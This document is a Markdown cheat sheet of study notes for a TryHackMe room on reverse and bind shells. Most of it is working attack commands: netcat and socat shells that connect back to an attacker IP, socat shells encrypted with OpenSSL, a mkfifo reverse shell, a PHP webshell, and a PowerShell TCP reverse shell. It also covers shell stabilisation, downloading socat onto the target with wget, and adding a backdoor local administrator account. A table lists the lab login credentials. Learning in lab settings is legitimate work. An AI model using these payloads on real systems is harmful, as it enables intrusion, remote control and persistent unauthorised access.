<!-- TOC -->

- [What the Shell?](#what-the-shell)
    - [Tools](#tools)
        - [Reverse Shells](#reverse-shells)
        - [Bind Shells](#bind-shells)
    - [Netcat Shell Stabilisation](#netcat-shell-stabilisation)
        - [Fully stable Linux tty reverse shell Only for Linux:](#fully-stable-linux-tty-reverse-shell-only-for-linux)
    - [Socat Encrypted Shells](#socat-encrypted-shells)
        - [Reverse shell](#reverse-shell)
        - [Bind shell](#bind-shell)
    - [Common Shell Payloads](#common-shell-payloads)
    - [Next Step](#next-step)
    - [Practice and Examples](#practice-and-examples)

<!-- /TOC -->

# What the Shell?

[What the Shell? Room](https://tryhackme.com/room/introtoshells)

An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.

## Tools

- Netcat
- Socat
- Metasploit: multi/handler
- Msfvenom
- [Reverse Shell Generator](https://www.revshells.com/)
- [revshellgen](https://github.com/t0thkr1s/revshellgen)
- `/usr/share/webshells`

### Reverse Shells

```bash
nc -lvnp <port-number>
```

```bash
socat TCP-L:<port> -
```

Be aware that if you choose to use a port below 1024, you will need to use `sudo` when starting your listener. That said, it's often a good idea to use a well-known port number (`80`, `443` or `53` being good choices) as this is more likely to get past outbound firewall rules on the target.

To connect back:

- On Windows:

```cmd
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

- On Linux:

```bash
nc <target-ip> <chosen-port>
```

```bash
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

### Bind Shells

```bash
nc -lvnp <PORT> -e /bin/bash
```

- On Linux:

```bash
socat TCP-L:<PORT> EXEC:"bash -li"
```

- On Windows:

```cmd
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

We use the `pipes` argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

To connect:

```bash
nc <LOCAL-IP> <LOCAL-PORT>
```

```bash
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

## Netcat Shell Stabilisation

- `python` for linux
    1. `python -c 'import pty;pty.spawn("/bin/bash")'` - Note: some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required.
    2. `export TERM=xterm` - this will give us access to term commands such as `clear`.
    3. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

Note: if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

- `rlwrap` for windows
    - `sudo apt install rlwrap`
    - `rlwrap nc -lvnp <port>`

Note: when dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

- `socat` for linux
    - Transfer a socat static compiled binary up to the target machine. `sudo python3 -m http.server 80`, then, on the target machine, `wget <LOCAL-IP>/socat -O /tmp/socat`.

 If you want to use something like a text editor which overwrites everything on the screen.

Open another terminal and run:

 ```bash
stty -a
 ```

 In your reverse/bind shell, type in:

 ```bash
stty rows <number>
stty cols <number>
 ```

### Fully stable Linux tty reverse shell (Only for Linux):

Here is the new listener syntax:

```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

The special command is as follows:

```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

[Precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)

- `pty`, allocates a pseudoterminal on the target: part of the stabilisation process
- `stderr`, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
- `sigint`, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- `setsid`, creates the process in a new session
- `sane`, stabilises the terminal, attempting to "normalise" it.

## Socat Encrypted Shells

Generate a cert:

```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
```

### Reverse shell

```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

Note: that the certificate must be used on whichever device is listening.

To connect back:

```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

### Bind shell

```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

Attacker:

```bash
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

## Common Shell Payloads

Bind:

```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Reverse:

```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Webshell (PHP):

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Powershell:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## Next Step

For Windows only:

```cmd
net user <username> <password> /add
```

```cmd
net localgroup administrators <username> /add
```

## Practice and Examples

| Title | IP Address | Username | Password |
| :---- | :---- | :---- | :---- |
| Linux Shell Practice | `1*.**.***.***` | shell | TryH4ckM3! |
| Win Shell Practice | `1*.**.***.***` | Administrator | TryH4ckM3! |
